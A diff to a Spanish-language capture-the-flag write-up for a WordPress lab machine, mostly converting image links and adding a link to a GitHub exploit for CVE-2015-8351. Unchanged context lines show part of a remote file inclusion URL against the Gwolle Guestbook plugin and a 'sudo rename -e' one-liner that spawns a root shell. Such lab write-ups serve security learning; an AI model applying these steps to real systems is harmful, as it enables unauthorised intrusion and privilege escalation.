@@ -7,7 +7,7 @@ VectorInicial: RFI
 Privesc: Sudo rename
 Fecha: 2026-02-23
 ---
-![](..\attachments/Pasted%20image%2020260218113338.png)
+<img width="585" height="397" alt="Pasted image 20260218113338" src="https://github.com/user-attachments/assets/9379e35f-eb30-4de0-a170-c3ab4a599357" />
 
 Empezaremos con un reconocimiento de red para ver la IP de este laboratorio.
 
@@ -78,7 +78,7 @@ GENERATED WORDS: 4612
 
 Bueno, parece que estamos frente a un *Wodpress* así que vamos a mirar la web a ver si podemos ver algo interesante que podamos usar.
 
-![](..\attachments/Pasted%20image%2020260223110618.png)
+<img width="268" height="312" alt="Pasted image 20260223110618" src="https://github.com/user-attachments/assets/cc1df6fc-b176-48f6-bdd6-b0732f1eda40" />
 
 Curiosamente solo nos aparece texto de mala manera, esto indica que estamos frente a un dominio, al pasar el ratón por encima de *¡Hello World!* vemos que el dominio es **remote.nyx**. ahora tendremos que añadirlo a nuestro */etc/hosts*.
 
@@ -167,6 +167,8 @@ http://[host]/wp-content/plugins/gwolle-gb/frontend/captcha/ajaxresponse.php?abs
 ```
 
 Así mismo hay exploit en *GitHub* que ayudan a automatizar esta explotación.
+
+[CVE-2015-8351](https://github.com/NexusFireMan/Exploits/tree/main/CVE-2015-8351)
 
 Pero yo utilizare el siguiente código.
 
@@ -346,6 +348,3 @@ sudo rename -e 'system("/bin/bash")' test.txt
 ```
 
 Con esto ya tenemos comprometida la maquina.
-
-
-
